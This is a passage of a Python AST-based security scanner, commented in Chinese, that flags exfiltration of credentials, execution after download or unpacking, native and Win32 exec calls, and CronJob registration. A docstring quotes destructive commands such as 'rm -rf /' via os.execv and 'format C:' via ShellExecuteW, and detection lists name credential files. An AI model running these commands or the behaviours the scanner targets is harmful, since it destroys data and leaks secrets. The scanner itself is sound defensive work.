    low = (text or "").lower()
    if "kind: cronjob" not in low and "kind:cronjob" not in low:
        return out
    for n in ast.walk(tree):
        if not isinstance(n, ast.Call):
            continue
        nm = _dotted(n.func)
        if nm not in ("subprocess.run", "subprocess.call", "subprocess.check_output",
                      "subprocess.Popen", "os.system", "sh"):
            continue
        try:
            src = ast.unparse(n).lower()
        except Exception:
            src = ""
        if "kubectl" in src and ("apply" in src or "create" in src):
            out.append(AstFinding(
                severity="HIGH",
                message="以清单部署 CronJob：外部调度器之后按 cron 周期执行清单里的命令",
                line=n.lineno, col=0))
            break
    return out


def _exfil_findings(tree) -> List[AstFinding]:
    """§3bt：读敏感内容 + 网络外发（数据外泄面）。

    一位普通技能读 `.env` / `~/.aws/credentials` / `/etc/passwd` / `os.environ`，
    再把内容 `requests.post` 出去，或塞进域名做 DNS 外泄。每一步单看都正常。
    基线：CWE-200 / CWE-201 / CWE-532；ATT&CK T1041、T1048、T1071.001；ASVS V7.1。
    """
    findings: List[AstFinding] = []
    tainted: dict = {}
    sinks: list = []
    sensitive_reads: list = []

    # 1) 污染传播：赋值右值里出现敏感读取，左侧变量即污染（迭代几轮覆盖 a→b→c）
    for _ in range(4):
        changed = False
        for n in ast.walk(tree):
            if not isinstance(n, ast.Assign):
                continue
            if _has_sensitive_ref(n.value, tainted):
                for t in n.targets:
                    if isinstance(t, ast.Name) and t.id not in tainted:
                        tainted[t.id] = n.lineno
                        changed = True
        if not changed:
            break

    # 2) 采集敏感读取与网络 sink
    for n in ast.walk(tree):
        if not isinstance(n, ast.Call):
            continue
        name = _dotted(n.func) or ""
        if name in ("open", "io.open") and n.args and isinstance(n.args[0], ast.Constant) and \
                isinstance(n.args[0].value, str) and \
                any(s in n.args[0].value.lower() for s in _SENSITIVE_SOURCES):
            sensitive_reads.append((n.lineno, n.args[0].value))
        if name in ("subprocess.check_output", "subprocess.run", "subprocess.getoutput") and \
                _has_sensitive_ref(n, {}):
            sensitive_reads.append((n.lineno, "subprocess 读取敏感路径"))
        if name.endswith("read_text") or name.endswith("read_bytes"):
            recv = getattr(n.func, "value", None)
            if isinstance(recv, ast.Call) and recv.args and \
                    isinstance(recv.args[0], ast.Constant) and \
                    isinstance(recv.args[0].value, str) and \
                    any(s in recv.args[0].value.lower() for s in _SENSITIVE_SOURCES):
                sensitive_reads.append((n.lineno, recv.args[0].value))
        if name in _NET_SINKS or name.endswith(("sendmail", "send", ".request")):
            sinks.append(n)

    if not sinks:
        return findings

    # 3) 判级：载荷位带敏感内容 → CRITICAL；同文件共存 → HIGH
    direct = []
    for s in sinks:
        name = _dotted(s.func) or ""
        pos = list(s.args)
        if name.startswith(("requests.", "urllib", "urlopen")) or name.endswith(".request"):
            pos = pos[1:] if pos else pos      # 第一位是 URL/方法
        if name.endswith("sendmail"):
            pos = pos[2:] if len(pos) > 2 else []
        kws = [k.value for k in s.keywords if k.arg not in _SKIP_KW]
        if _sink_payload(pos + kws, name, tainted):
            direct.append(s)

    if direct:
        for s in direct:
            findings.append(AstFinding(
                severity="CRITICAL",
                message="读到的敏感内容经网络外发（%s）" % (_dotted(s.func) or "call"),
                line=s.lineno, col=0))
        return findings
    if sensitive_reads:
        ln, what = sensitive_reads[0]
        findings.append(AstFinding(
            severity="HIGH",
            message="同文件内既读敏感内容（%s，第 %d 行）又有网络外发口，静态无法确认同源"
                    % (what, ln),
            line=sinks[0].lineno, col=0))
    return findings


def _archive_run_findings(tree) -> List[AstFinding]:
    """§3bq：解包后执行包内文件。

    `tarfile.open(...).extractall("/tmp/x")` 再 `subprocess.run(["/tmp/x/run.sh"])`
    —— 每一步单看都"没有危险词"：解包是正常操作，跑脚本也是正常操作。
    危险在**两步之间**：跑的东西不在仓内、是刚从包里出来的。
    基线：ATT&CK T1027.002（Software Packing）+ T1105（Ingress Tool Transfer）。
    """
    consts, _temps, lists = collect_consts(tree)
    dirs, execs = set(), []

    def _norm_dir(p):
        q = _norm(p).rstrip("/")
        return q or None

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        name = _dotted(node.func)
        # 解包目录（`tarfile.open(x).extractall("/tmp/x")` 折出的点号名可能只有末段）
        if name in ("extractall", "extract") or name.endswith((".extractall", ".extract")):
            for a in node.args:
                s = _fold_str(a, consts)
                if s:
                    d = _norm_dir(s)
                    if d:
                        dirs.add(d)
        # 执行路径
        argv = None
        if name.startswith("subprocess.") or name in ("os.execv", "os.execvp",
                                                      "os.execve", "os.execvpe"):
            argv = static_argv(node, name, consts, _temps, lists)
        elif name in ("os.system", "os.popen"):
            s = _fold_str(node.args[0], consts) if node.args else None
            argv = [s] if s else None
        if argv:
            for tok in argv:
                if isinstance(tok, str) and "/" in tok:
                    execs.append((token_line(node), _norm(tok)))

    out = []
    for line, path in execs:
        for d in dirs:
            if path.startswith(d + "/") or path == d:
                out.append(AstFinding(
                    severity="CRITICAL",
                    message="解包后执行包内文件：%s 是从 %s 里解出来的，不在仓内、"
                            "也不是安装来源" % (path, d),
                    line=line, col=0))
                break
    return out


def token_line(node) -> int:
    """取调用所在行（AstFinding 要行号）。"""
    return getattr(node, "lineno", 0)


class NativeExecVisitor(ast.NodeVisitor):
    """§3bo：不走 subprocess 的执行面。

    判据挂在 `subprocess.run/popen` 上时，换一条等价通道就整类绕过：
    `os.execv` / `os.spawn*` / `os.posix_spawn*`（进程替换、spawn）、
    `ctypes.windll.*.WinExec | ShellExecuteW | CreateProcessW`（直接调 Win32）、
    `importlib.import_module("shutil")` 再 `getattr(m, "rmtree")(…)`（动态导入取函数）。

    修前实测：`os.execv("/usr/bin/rm", ["rm","-rf","/"])` **99/A+**、
    `ShellExecuteW(None,"open","cmd.exe","/c format C:")` **100/A+** —— 看见但不拦。
    纪律：判的是"参数是什么"，不是"函数名在黑名单里没有"。
    """

    NATIVE = ("os.execv", "os.execve", "os.execvp", "os.execvpe", "os.execl",
              "os.execle", "os.execlp", "os.execlpe", "os.spawnl", "os.spawnle",
              "os.spawnlp", "os.spawnlpe", "os.spawnv", "os.spawnve", "os.spawnvp",
              "os.spawnvpe", "os.posix_spawn", "os.posix_spawnp")
    WIN_SINKS = ("winexec", "shellexecute", "shellexecutea", "shellexecutew",
                 "createprocess", "createprocessa", "createprocessw")
    EXEC_TARGETS = ("os.system", "os.popen", "subprocess.run", "subprocess.call",
                    "subprocess.check_output", "subprocess.check_call",
                    "subprocess.Popen")

    def __init__(self):
        self.findings: List[AstFinding] = []
        self.consts, self.lists = {}, {}
        self.modules = {}
        self.aliases = {}

    def prepare(self, tree):
        self.consts, _temps, self.lists = collect_consts(tree)
        self.aliases = collect_func_aliases(tree)
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Assign, ast.AnnAssign)):
                continue
            value = getattr(node, "value", None)
            if not isinstance(value, ast.Call):
                continue
            fname = _dotted(value.func)
            if (fname.endswith("import_module") or fname == "__import__") and value.args:
                mod = _fold_str(value.args[0], self.consts)
                if mod and isinstance(node, ast.Assign):
                    for t in node.targets:
                        if isinstance(t, ast.Name):
                            self.modules[t.id] = mod

    def _tokens(self, node) -> list:
        toks = []
        for a in node.args:
            if isinstance(a, (ast.List, ast.Tuple)):
                folded = _fold_argv(a, self.consts)
                if folded:
                    toks.extend(folded)
                continue
            if isinstance(a, ast.Name) and self.lists.get(a.id):
                toks.extend(self.lists[a.id])
                continue
            s = _fold_str(a, self.consts)
            if s:
                toks.extend(s.split())
        return toks

    def _any_position(self, toks):
        """命令可能不是第一个 token（`ShellExecuteW(None,"open","cmd.exe","/c format C:")`），
        所以每个起点都试一遍，命中即返回。"""
        for i in range(len(toks)):
            v = destructive_tokens(toks[i:])
            if v:
                return v
        return None

    def visit_Call(self, node):
        name = self.aliases.get(_dotted(node.func), _dotted(node.func))
        low = name.lower()

        # 1 进程替换 / spawn：把参数当命令判
        if name in self.NATIVE:
            toks = self._tokens(node)
            v = self._any_position(toks) if toks else None
            if v:
                self.findings.append(AstFinding(
                    severity=v[0],
                    message="%s 用原生执行面跑破坏命令：%s" % (name, v[1]),
                    line=node.lineno, col=0))

        # 2 ctypes 直接调 Win32 拉起进程
        elif any(low.endswith(s) for s in self.WIN_SINKS) or (
                isinstance(node.func, ast.Attribute) and
                node.func.attr.lower().startswith(("winexec", "shellexecute", "createprocess"))):
            toks = self._tokens(node)
            v = self._any_position(toks) if toks else None
            if v:
                self.findings.append(AstFinding(
                    severity=v[0],
                    message="通过 ctypes 原生 API 执行破坏命令（%s）：%s"
                            % (_dotted(node.func), v[1]),
                    line=node.lineno, col=0))

        # 3 getattr(动态导入的模块, "危险函数")(…)
        if name == "getattr" and len(node.args) >= 2:
            obj, attr = node.args[0], node.args[1]
            attr_s = _fold_str(attr, self.consts)
            mod = None
            if isinstance(obj, ast.Name):
                mod = self.modules.get(obj.id)
            elif isinstance(obj, ast.Call) and obj.args:
                mod = _fold_str(obj.args[0], self.consts)
            if mod and attr_s:
                full = "%s.%s" % (mod, attr_s)
                if full in self.EXEC_TARGETS or full.startswith(("os.system", "os.popen")):
                    self.findings.append(AstFinding(
                        severity="HIGH",
                        message="动态导入 + getattr 取到执行函数：%s（函数名运行期才出现）" % full,
                        line=node.lineno, col=0))
                elif full in _NATIVE_DESTRUCTIVE:
                    self.findings.append(AstFinding(
                        severity=_NATIVE_DESTRUCTIVE[full][0],
                        message="动态导入 + getattr 取到破坏函数：%s（%s）"
                                % (full, _NATIVE_DESTRUCTIVE[full][1]),
                        line=node.lineno, col=0))
        self.generic_visit(node)


class AutostartWriteVisitorPlaceholder:
    pass


# 动态导入后 getattr 取用的破坏函数（不是执行面，但同样"函数名运行期才出现"）
_NATIVE_DESTRUCTIVE = {
    "shutil.rmtree": ("CRITICAL", "递归删目录"),
    "os.remove": ("HIGH", "删文件"),
    "os.unlink": ("HIGH", "删文件"),
    "os.rmdir": ("HIGH", "删目录"),
    "shutil.move": ("MEDIUM", "移动/覆盖文件"),
    "os.rename": ("MEDIUM", "改名/覆盖文件"),
}


def analyze_python_file(filepath: Path) -> List[AstFinding]:
    """Analyze a Python file with AST, return findings."""
    try:
        content = filepath.read_text(encoding="utf-8", errors="replace")
        tree = ast.parse(content, filename=str(filepath))
    except Exception:
        return []

    findings = []

    # §3bf：先收常量表，再判——否则"把字面量藏进变量"就是一条免费后门
    consts, temps, lists = collect_consts(tree)
    aliases = collect_func_aliases(tree)

    # Dangerous calls
    call_visitor = DangerousCallVisitor()
    call_visitor.consts = consts
    call_visitor.temps = temps
    call_visitor.lists = lists
    call_visitor.aliases = aliases
    call_visitor.visit(tree)
    findings.extend(call_visitor.findings)

    # 名字被拆开/动态取用的危险调用（§3av）
    dyn_visitor = DynamicCallVisitor()
    dyn_visitor.visit(tree)
    findings.extend(dyn_visitor.findings)

    # Hardcoded secrets
    secret_visitor = HardcodedSecretVisitor()
    secret_visitor.visit(tree)
    findings.extend(secret_visitor.findings)

    # §3bl：两步链路——下载了哪个文件，之后又执行了哪个文件（含跨行）
    base_dir = filepath.parent
    two = TwoStepExecVisitor(str(base_dir))
    two.prepare(tree)
    two.visit(tree)
    hit = None
    for ex_path, line in two.execs:
        for dl_path, _dl_line in two.downloads:
            if _same_path(dl_path, ex_path):
                hit = (ex_path, line)
                break
        if hit:
            break
    if not hit:
        # §3bn：解码产物被当成程序名直接跑（`certutil -decode p.b64 p.exe` → `p.exe`）
        for prog, line in two.programs:
            pb = _basename(prog)
            for dl_path, _dl_line in two.downloads:
                if not _norm(dl_path).endswith(_EXEC_FILE_EXTS):
                    continue
                if pb and pb == _basename(dl_path):
                    hit = (prog, line)
                    break
            if hit:
                break
    if hit:
        findings.append(AstFinding(
            severity="CRITICAL",
            message="取回后落盘再执行：先下载 %s，随后执行同一路径（两步链路）" % hit[0],
            line=hit[1], col=0))
    else:
        # 命令写在文件里：把文件内容读进来判，而不是只看文件名
        for ex_path, line in two.execs:
            v = _script_file_verdict(ex_path, base_dir)
            if v:
                findings.append(AstFinding(severity=v[0], message=v[1], line=line, col=0))
                break

    # §3bm：写入即执行——open(自启动位置, "w"/"a")、shutil.copy(…, 自启动位置)
    auto_visitor = AutostartWriteVisitor()
    auto_visitor.text = content
    auto_visitor.prepare(tree)
    auto_visitor.visit(tree)
    findings.extend(auto_visitor.findings)

    # §3bn：解码/拼接后执行
    dec_visitor = DecodedExecVisitor()
    dec_visitor.prepare(tree)
    dec_visitor.visit(tree)
    findings.extend(dec_visitor.findings)

    # §3bo：不走 subprocess 的执行面（进程替换 / spawn / ctypes Win32 / 动态导入取函数）
    native_visitor = NativeExecVisitor()
    native_visitor.prepare(tree)
    native_visitor.visit(tree)
    findings.extend(native_visitor.findings)

    # §3bq：解包后执行包内文件（压缩包 → 目录 → 跑）
    findings.extend(_archive_run_findings(tree))

    # §3br：配置文件读入的值进入执行面（只在仓内读配置，不越界）
    findings.extend(_config_exec_findings(tree, filepath.parent))

    # §3bs：路径穿越与链接（解包成员 / 链接 / 仓外写入）
    findings.extend(_path_escape_findings(tree, filepath.parent))

    # §3bt：读敏感内容 + 网络外发（数据外泄面）
    findings.extend(_exfil_findings(tree))

    # §3bu：调度器注册面（清单部署 CronJob 一类）
    findings.extend(_scheduler_manifest_findings(tree, content))

    return findings


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python ast_analyzer.py <file.py>")
        sys.exit(1)

    findings = analyze_python_file(Path(sys.argv[1]))
    for f in findings:
        print(f"[{f.severity}] line {f.line}: {f.message}")
